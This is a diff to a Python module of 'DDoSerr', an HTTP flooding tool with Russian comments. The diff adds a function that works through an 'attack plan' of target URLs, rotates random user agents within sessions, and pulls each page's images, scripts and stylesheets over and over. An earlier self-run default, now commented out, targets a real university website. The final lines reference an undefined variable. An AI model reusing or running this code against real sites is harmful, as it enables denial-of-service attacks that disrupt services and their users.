@@ -60,7 +60,7 @@ DDoSerr Copyright © 2018 Константин Панков
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.6.2.15b. от 23.08.2018.
+v.1.6.3.4b. от 02.09.2018.
 """
 
 """
@@ -84,6 +84,8 @@ import logging
 import html_parser
 #Подключаем модуль работы с user agent-ами.
 import user_agents
+#Импортируем класс плана атаки из соответствующего модуля.
+from attack_plan import Plan
 
 
 #Настройка логгирования.
@@ -91,13 +93,14 @@ logging.basicConfig(filename='log.log',level=logging.INFO, \
 format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')
 
 
-def http_connection(repeat, pause, url):
+def http_connection(repeat, delay, url):
     #Если не задаётся извне значение url, то берётся указанное.
-    #(repeat, pause, url="http://127.0.0.1")
+    #(repeat, delay, url="http://127.0.0.1")
     
     """
     Функция для создания 1 процесса, запросов к сайту и получения ответа.
-    Подгружает контент со страницы (картинки, java-скрипты, CSS стили).
+    Подгружает страницу и контент со страницы 
+    (картинки, java-скрипты, CSS стили).
     """
     
     #Вызов парсера странцы и получение списка ссылок 
@@ -122,6 +125,7 @@ def http_connection(repeat, pause, url):
         main_page = session.get(url, stream=True, headers=\
         {'User-Agent': random_agent})
         
+        
         #Получение информации по запросу к странице по url.
         
         #Код возврата.
@@ -142,15 +146,6 @@ def http_connection(repeat, pause, url):
         logging.info('URL: ' + url)
         logging.info('Answer: ' + answer_url)
         
-        """
-        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-        Сделать цикл для запросов. - Выполнено.
-        Добавить выбор рандомного юзер агента. - Выполнено.
-        Заставить работать сессию с юзер агенторм - Переделать headers. - Выполнено.
-        
-        !Сделать модуль для обхода страниц с задержками!
-        !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-        """
         
         #Запрос контента со страницы по найденным ссылкам.
 
@@ -200,27 +195,157 @@ def http_connection(repeat, pause, url):
         
         
         #Задержка перед повтором цикла.
-        time.sleep(pause)
+        time.sleep(delay)
+        
+    #Закрываем файл юзер агентов.
+    agents_close = user_agents.Agents().agents_close()
+        
+
+def http_connection_plan(repeat, delay):
+    
+    """
+    Модификация функции для создания 1 процесса, 
+    запросов к сайту и получения ответа.
+    Использует план тестирования (атаки).
+    Подгружает страницу и контент со страницы 
+    (картинки, java-скрипты, CSS стили).
+    """
+    
+    #Вызов функции плана тестирования и получение списков.
+    #plan_url, plan_pause = Plan().plan()
+    plan = Plan().plan()
+    plan_url = Plan().plan_url
+    #url = Plan().plan_url
+    plan_pause = Plan().plan_pause
+    #Размер списка для цикла.
+    plan_length = len(plan_url)
+    
+
+    #Цикл выполняет задание 'repeat' раз в каждом процессе.
+    for _ in range(repeat):
+        #Создаём сессию.
+        session = requests.Session()
+        
+        #Вызываем модуль агентов и получаем рандомного агента из списка.
+        random_agent = user_agents.Agents().random_agent()
+        
+        """
+        #Для post запросов, пригодится в будущем.
+        #main_page = requests.post("http://httpbin.org/post")
+        """
+        
+        """
+        Сделать модуль для обхода страниц с задержками.
+        Встроить цикл сюда.
+        """
+        #Работа с планом тестирования.
+        for item in range(plan_length):
+            url = plan_url[item]
+            pause = int(plan_pause[item])
+            
+            #Вызов парсера странцы и получение списка ссылок 
+            #на подгружаемый контент.
+            content_urls = html_parser.obj_search(url)
+            
+            #-----
+            #print("DEBUGG!" + url + pause)
+            #-----
+        
+            #Запрос к url (атакуемой странице) с юзер агентом в сессии.
+            main_page = session.get(url, stream=True, headers=\
+            {'User-Agent': random_agent})
+            
+            
+            #Получение информации по запросу к странице по url.
+            
+            #Код возврата.
+            status_url = str(main_page.status_code)
+            #Размер ответа. Большой ответ разбивается на куски по 8196 Байт.
+            size_url = str(sum(len(chunk) for chunk in main_page.iter_content(8196)))
+        
+            #Этот вывод результата (для наглядности работы и отладки)
+            #можно убрать для небольшого повышения производительности.
+            print(status_url, size_url)
+            
+            answer_url = str("code " + status_url + "," + '\t' + 
+            "size " + size_url + " bytes")
+            
+            #Логгируем запуск процесса с его PID.
+            logging.info('Process ' + str(os.getpid()) +
+            ' received the task.')
+            #Логгируем результаты.
+            logging.info('URL: ' + url)
+            logging.info('Answer: ' + answer_url)
+            
+            
+            #Запрос контента со страницы по найденным ссылкам.
+        
+            for _ in range(len(content_urls)):
+                #Система прохода по списку ссылок на контент для его подгрузки.
+                #И всё это должно подгружаться сразу, для каждой сессии,
+                #поэтому нужен отдельный цикл внутри задания.
+                
+                #_ или item.
+                current_url = content_urls[_]
+                
+                #Содаём подготовленный запрос с юзер агентом.
+                
+                req = requests.Request('GET', current_url, \
+                headers={'User-Agent': random_agent})
+                
+                prepped = session.prepare_request(req)
+                
+                content_on_page = session.send(prepped)
+                
+                
+                #---
+                #Без юзер агента.
+                ##content_on_page = session.get(current_url)
+                #---
+                
+                
+                #Получение информации по контенту.
+                
+                #Код возврата.
+                status = str(content_on_page.status_code)
+                #Размер ответа. Большой ответ разбивается на куски по 8196 Байт.
+                size = str(sum(len(chunk) for chunk in content_on_page.iter_content(8196)))
+            
+                #Этот вывод результата (для наглядности работы и отладки)
+                #можно убрать для небольшого повышения производительности.
+                print(status, size)
+            
+                answer = str("code " + status + "," + '\t' + "size " + size +\
+                " bytes")
+            
+                #Логгируем запуск процесса с его PID.
+                logging.info('Process ' + str(os.getpid()) + ' received the task.')
+                #Логгируем результаты.
+                logging.info('URL: ' + current_url)
+                logging.info('Answer: ' + answer)
+        
+            #Встроить цикл до сюда. Тут time.sleep(pause).
+            time.sleep(pause)
+        
+        #Задержка перед повтором цикла.
+        time.sleep(delay)
         
     #Закрываем файл юзер агентов.
     agents_close = user_agents.Agents().agents_close()
         
 
 
-"""
-!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-!Вместо url надо сделать список адресов с задерками.
-!Организовать в отдельном модуле и вставить между основноы программой и
-этим модулем.
-!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-"""
-
-
 if __name__ == "__main__":
     #Временные параметры для самостоятельного запуска.
     repeat = 5
-    pause = 0.5
-    url = "https://edu.vsu.ru"
-    content_urls = html_parser.obj_search(url)
-    #Запуск функции.
-    http_connection(repeat, pause, url)
+    delay = 0.5
+    
+    ##mode = 'u'
+    ##url = "https://edu.vsu.ru"
+    ##content_urls = html_parser.obj_search(url)
+    ##Запуск функции.
+    ##http_connection(repeat, delay, url)
+    
+    #mode = "p"
+    http_connection_plan(repeat, delay)
+    content_urls = html_parser.obj_search(plan_url)
